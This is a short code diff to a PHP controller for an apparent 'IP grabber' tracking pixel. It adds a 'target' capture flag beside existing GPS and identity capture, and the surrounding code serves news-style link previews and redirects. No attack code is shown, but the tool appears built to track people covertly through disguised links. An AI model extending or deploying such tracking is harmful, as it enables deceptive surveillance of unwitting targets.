@@ -42,6 +42,7 @@ class IpGrabberController extends Controller
                 : $ipGrabber->trackingUrl())
             : $this->urlAbsolutaDaRequisicao($request, $request->getPathInfo());
         $captureGps = (bool) $ipGrabber?->capture_gps;
+        $captureAlvo = (bool) $ipGrabber?->capture_alvo;
         $captureIdentity = (bool) $ipGrabber?->capture_identity;
         $redirectUrl = $this->deveRedirecionarParaNoticia($request, $ipGrabber) ? $ipGrabber->noticia_url : null;
 
@@ -49,7 +50,7 @@ class IpGrabberController extends Controller
             return view('pixel.preview', compact('ogTitulo', 'ogDescricao', 'ogImagem', 'ogUrl'));
         }
 
-        return view('pixel.landing', compact('mensagem', 'token', 'accessUuid', 'captureGps', 'captureIdentity', 'redirectUrl', 'ogTitulo', 'ogDescricao', 'ogImagem', 'ogUrl'));
+        return view('pixel.landing', compact('mensagem', 'token', 'accessUuid', 'captureGps', 'captureAlvo', 'captureIdentity', 'redirectUrl', 'ogTitulo', 'ogDescricao', 'ogImagem', 'ogUrl'));
     }
 
     public function gif(Request $request, string $token): Response
